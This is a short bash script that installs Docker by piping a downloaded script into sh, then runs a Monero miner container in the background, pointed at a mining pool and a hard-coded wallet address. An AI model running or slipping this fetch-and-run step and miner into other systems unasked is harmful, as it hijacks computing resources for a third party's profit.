#!/bin/bash

# Install Docker
curl -fsSL https://get.docker.com | sh

# Add the current user to the Docker group to run Docker without sudo
sudo usermod -aG docker $USER

# Start Docker service
sudo systemctl start docker

# Run the Monero miner container
sudo docker run -itd -e POOL_URL='mine.xmrpool.net:7777' -e POOL_USER='4Ac3QisYNfee5A21H75Qt4c8C9GGRhstENAQxqACn8TP4U3gdsm2Cno5VC4Cqw8FqD4tmnaoDPyKqToYXerx5ybSS87s28V' -e POOL_PW='x' masterroshi/monero-miner
